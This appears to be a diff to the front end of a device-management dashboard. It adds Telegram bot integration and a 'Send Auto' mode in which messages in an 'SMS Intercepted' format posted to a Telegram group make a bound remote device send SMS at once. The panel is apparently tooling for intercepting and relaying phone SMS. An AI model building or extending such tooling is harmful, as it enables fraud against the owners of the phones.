@@ -345,6 +345,7 @@
         switchView(v);
         if (v === "overview" || v === "devices") loadDevices(true);
         if (v === "favorites") renderFavorites();
+        if (v === "telegram") loadTelegramBot();
       };
     });
     $("btnRefresh").onclick = () => {
@@ -375,9 +376,11 @@
     show("viewDevices", view === "devices");
     show("viewFavorites", view === "favorites");
     show("viewProjects", view === "projects");
+    show("viewTelegram", view === "telegram");
     show("viewDetail", view === "detail");
     if (view === "projects") loadProjects(true);
     if (view === "favorites") renderFavorites();
+    if (view === "telegram") loadTelegramBot();
   }
 
   function startRefresh() {
@@ -902,6 +905,182 @@
       });
       toast("SMS queued!");
       $("smsMsg").value = "";
+    } catch (e) { toast(e.message, true); }
+  };
+
+  async function pasteInto(elId) {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (!text) return toast("Clipboard empty", true);
+      $(elId).value = text.trim();
+      toast("Pasted");
+    } catch (e) {
+      toast("Clipboard paste allowed nahi — manually paste karo", true);
+    }
+  }
+
+  $("btnPasteSmsTo").onclick = () => pasteInto("smsTo");
+  $("btnPasteSmsMsg").onclick = () => pasteInto("smsMsg");
+
+  $("btnSendAuto").onclick = async () => {
+    if (!activeDevice || !activeProjectId) return;
+    try {
+      const data = await api("/api/telegram/groups");
+      const groups = data.groups || [];
+      if (!groups.length) {
+        toast("Pehle Telegram Bot page pe bot connect + group add karo", true);
+        return;
+      }
+      const labels = groups.map((g, i) =>
+        `${i + 1}. ${g.title} (${g.chatId})` +
+        (g.autoSend?.deviceId === activeDevice.id ? " [THIS DEVICE]" : g.autoSend ? ` → ${g.autoSend.deviceName}` : "")
+      ).join("\n");
+      const pick = prompt(
+        "Send Auto — group number choose karo (is device bind hoga):\n\n" + labels +
+        "\n\n0 = cancel\nYaha SMS Intercepted format aate hi number+msg device se turant send."
+      );
+      if (pick == null || pick === "0" || pick === "") return;
+      const idx = Number(pick) - 1;
+      if (!groups[idx]) return toast("Invalid choice", true);
+      const g = groups[idx];
+      await api("/api/telegram/groups/" + encodeURIComponent(g.chatId) + "/auto-send", {
+        method: "POST",
+        body: JSON.stringify({
+          projectId: activeProjectId,
+          deviceId: activeDevice.id,
+          deviceName: activeDevice.name || activeDevice.id,
+        }),
+      });
+      toast("Send Auto ON: " + (g.title || g.chatId));
+    } catch (e) { toast(e.message, true); }
+  };
+
+  async function loadTelegramBot() {
+    try {
+      const me = await api("/api/auth/me");
+      $("tg2faChatId").value = me.telegramChatId || "";
+      $("tg2faEnabled").checked = !!me.twoFactorEnabled;
+      const note = $("tg2faGlobalNote");
+      if (note) note.style.display = me.global2FA ? "block" : "none";
+    } catch (_) {
+      /* ignore */
+    }
+    const box = $("tgGroupList");
+    const status = $("tgBotStatus");
+    try {
+      const info = await api("/api/telegram/bot");
+      if (info.connected) {
+        status.textContent = "Connected @" + (info.botUsername || "bot") + (info.webhookSet ? " · webhook OK" : "");
+        status.style.color = "var(--green, #56ca00)";
+        $("tgWebhookUrl").value = info.webhookUrl || "";
+      } else {
+        status.textContent = "Not connected";
+        status.style.color = "";
+        $("tgWebhookUrl").value = "";
+      }
+      const groups = info.groups || [];
+      if (!groups.length) {
+        box.innerHTML = '<div class="empty">No groups — bot ko group me add karo ya manual ID daalo</div>';
+        return;
+      }
+      box.innerHTML = groups.map((g) => `
+        <div class="modal-card" style="margin-bottom:8px;justify-content:space-between">
+          <div>
+            <div class="val white">${esc(g.title)}</div>
+            <div class="lbl">${esc(g.type)} · <code>${esc(g.chatId)}</code></div>
+            <div class="lbl" style="margin-top:4px">${
+              g.autoSend
+                ? "Auto → " + esc(g.autoSend.deviceName || g.autoSend.deviceId)
+                : "Auto send: off"
+            }</div>
+          </div>
+          <div style="display:flex;gap:6px;flex-direction:column">
+            ${g.autoSend ? `<button class="btn btn-sm btn-outline" data-tg-unbind="${esc(g.chatId)}">Unbind</button>` : ""}
+            <button class="btn btn-sm btn-danger" data-tg-del="${esc(g.chatId)}">Delete</button>
+          </div>
+        </div>
+      `).join("");
+      box.querySelectorAll("[data-tg-del]").forEach((b) => {
+        b.onclick = async () => {
+          if (!confirm("Delete group from list?")) return;
+          try {
+            await api("/api/telegram/groups/" + encodeURIComponent(b.dataset.tgDel), { method: "DELETE" });
+            loadTelegramBot();
+          } catch (e) { toast(e.message, true); }
+        };
+      });
+      box.querySelectorAll("[data-tg-unbind]").forEach((b) => {
+        b.onclick = async () => {
+          try {
+            await api("/api/telegram/groups/" + encodeURIComponent(b.dataset.tgUnbind) + "/auto-send", {
+              method: "DELETE",
+            });
+            toast("Unbound");
+            loadTelegramBot();
+          } catch (e) { toast(e.message, true); }
+        };
+      });
+    } catch (e) {
+      status.textContent = "Error loading";
+      box.innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
+    }
+  }
+
+  $("btnSave2fa").onclick = async () => {
+    try {
+      await api("/api/auth/me", {
+        method: "PATCH",
+        body: JSON.stringify({
+          telegramChatId: $("tg2faChatId").value.trim(),
+          twoFactorEnabled: $("tg2faEnabled").checked,
+        }),
+      });
+      toast("2FA settings saved");
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnTgConnect").onclick = async () => {
+    const token = $("tgBotToken").value.trim();
+    if (!token) return toast("Bot token daalo", true);
+    try {
+      await api("/api/telegram/bot", { method: "POST", body: JSON.stringify({ token }) });
+      $("tgBotToken").value = "";
+      toast("Bot connected + webhook set");
+      loadTelegramBot();
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnTgRefreshWh").onclick = async () => {
+    try {
+      const r = await api("/api/telegram/bot/webhook", { method: "POST", body: "{}" });
+      $("tgWebhookUrl").value = r.webhookUrl || "";
+      toast("Webhook refreshed");
+      loadTelegramBot();
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnTgDisconnect").onclick = async () => {
+    if (!confirm("Disconnect Telegram bot?")) return;
+    try {
+      await api("/api/telegram/bot", { method: "DELETE" });
+      toast("Disconnected");
+      loadTelegramBot();
+    } catch (e) { toast(e.message, true); }
+  };
+
+  $("btnTgAddGroup").onclick = async () => {
+    const chatId = $("tgManualChatId").value.trim();
+    const title = $("tgManualTitle").value.trim();
+    if (!chatId) return toast("Chat ID daalo", true);
+    try {
+      await api("/api/telegram/groups", {
+        method: "POST",
+        body: JSON.stringify({ chatId, title: title || undefined }),
+      });
+      $("tgManualChatId").value = "";
+      $("tgManualTitle").value = "";
+      toast("Group added");
+      loadTelegramBot();
     } catch (e) { toast(e.message, true); }
   };
 
